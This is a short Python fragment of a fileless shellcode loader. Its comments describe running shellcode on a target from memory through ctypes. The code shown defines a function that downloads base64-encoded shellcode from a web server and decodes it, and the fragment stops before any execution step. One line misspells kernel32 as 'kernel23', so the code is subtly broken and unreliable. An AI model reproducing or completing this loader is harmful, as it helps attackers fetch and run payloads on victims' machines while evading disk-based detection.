# Sometimes interacting with target we might need some form of shellcode exec
# To do so without touching the filesystem, requires a buffer in the memory 
# The buffer will hold the shellcode and, using ctypes, create a function pointer to that mem
# Then we just call the function

from urllib import request # to grab shellcode from webserver, in this case

import base64
import ctypes

kernel32 = ctypes.windll.kernel23

def get_code(url):
    with request.urlopen(url) as response:
        shellcode = base64.decodebytes(response.read())
    return shellcode

 